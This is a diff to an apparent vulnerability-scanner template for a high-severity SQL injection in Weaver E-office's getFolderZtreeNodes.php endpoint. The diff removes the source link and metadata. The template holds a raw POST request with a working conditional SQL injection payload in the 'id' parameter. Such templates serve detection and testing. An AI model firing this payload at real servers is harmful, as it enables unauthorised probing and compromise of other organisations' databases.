@@ -3,17 +3,11 @@ info:
   name: 泛微 E-office getFolderZtreeNodes.php 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/unog88cqlrl19g8k'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: unog88cqlrl19g8k
-    fofa: 暂无
 http:
 - raw:
   - 'POST /general/system/file_folder/purview_new/getFolderZtreeNodes.php HTTP/1.1
-
-
 
 
     id=(SELECT (CASE WHEN (length(database())>0) THEN 1 ELSE (SELECT 9469 UNION SELECT 1668) END))&lv=0&n=&param=eyJmaWxlU29ydCI6bnVsbCwicm9vdCI6eyJuYW1lIjpudWxsLCJjaGVjayI6dHJ1ZSwidXJsIjoiL2dlbmVyYWwvZmlsZV9mb2xkZXIvZmlsZV9uZXcvZmlsZWxpc3QucGhwP1NPUlRfSUQ9MCZGSUxFX1NPUlQ9IiwidGFyZ2V0IjoiZmlsZV9tYWluIiwicmlnaHRDbGljayI6ZmFsc2V9LCJub2RlIjp7InJpZ2h0Q2xpY2siOmZhbHNlLCJ1cmwiOiIvZ2VuZXJhbC9maWxlX2ZvbGRlci9maWxlX25ldy9maWxlbGlzdC5waHAiLCJ0YXJnZXQiOiJmaWxlX21haW4iLCJsb2FkQWxsIjpmYWxzZX0sInNlbGVjdCI6eyJzb3J0aWQiOm51bGwsInNvcnRuYW1lIjpudWxsLCJnZXR3aGF0IjpudWxsLCJmaWxlc29ydCI6bnVsbCwiY2xpY2tGdW4iOiJzZWxlY3RfZm9sZGVyIn19
